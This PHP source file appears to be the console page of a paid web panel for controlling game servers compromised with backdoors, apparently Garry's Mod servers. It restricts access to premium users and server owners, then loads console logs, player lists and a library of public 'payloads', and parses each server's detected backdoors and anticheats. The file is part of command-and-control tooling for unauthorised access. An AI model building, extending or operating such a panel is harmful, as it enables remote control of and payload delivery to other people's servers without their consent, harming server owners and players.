<?php

// if ($_SESSION['user']['id'] != 1) {
// 	require dirname(dirname(__DIR__)) . "/public/maintenance.php";
// 	die();
// }


if($AUTHUSER['roles'] == 0) {

	Logs::AddLogs(
		"User ".$AUTHUSER['username']." attempted to access a premium page (Console)", 
		"danger", 
		"fas fa-baby-carriage"
	);

	die(header('location:/overview'));
}

function time_to_hours($Time)
{
	if ($Time < 3600) {
		$heures = 0;

		if ($Time < 60) {
			$minutes = 0;
		} else {
			$minutes = round($Time / 60);
		}
		$secondes = floor($Time % 60);
	} else {
		$heures = round($Time / 3600);
		$secondes = round($Time % 3600);
		$minutes = floor($secondes / 60);
	}

	$secondes2 = round($secondes % 60);

	$TimeFinal = "$heures h $minutes min $secondes2 s";
	return $TimeFinal;
}

if(!Server::ServerExist($_GET['id']))
{
	die(header('location:/servers'));
}

$server = Server::GetServer($_GET['id']);

$ip = $server['ip'];
$countfiles = 0;

if($server['owner'] != $AUTHUSER['id'] && $AUTHUSER['roles'] < 3) {

	Logs::AddLogs(
		"User ".htmlentities($AUTHUSER['username'])." attempted to access server panel for server ID: ".htmlentities($server['id'])." that does not belong to them", 
		"danger", 
		"fas fa-baby-carriage"
	);

	die(header('location:/servers'));
}

$chats =  Console::GetLastServerConsole($server['ip']);

$categories = Category::getAll();

$payloads = Payload::getAllPublic();

$players = json_decode($server["playerlist"]);

$server_status = ($server['last_update'] + 120 >= time()) ? '#22a003' : '#ba0000';

$title = $server['ip'];

// Backdoor and Anticheat detection
$backdoors = json_decode($server['backdoors'], true);
$detection = [];
$detection['anticheat']['snte'] = false;
$detection['anticheat']['cac'] = false;

foreach($backdoors as $backdoor) {

	if(isset($backdoor['anticheat'])) {
		if($backdoor['anticheat'] == "SNTE") {
			$detection['anticheat']['snte'] = true;
		}
		if($backdoor['anticheat'] == "CAC") {
			$detection['anticheat']['cac'] = true;
		}
	}

	if(isset($backdoor['net'])) {
		$detection['backdoor'][] = ['name' => $backdoor['net'], 'function' => $backdoor['func'], 'filename' => $backdoor['file']];
	}
}
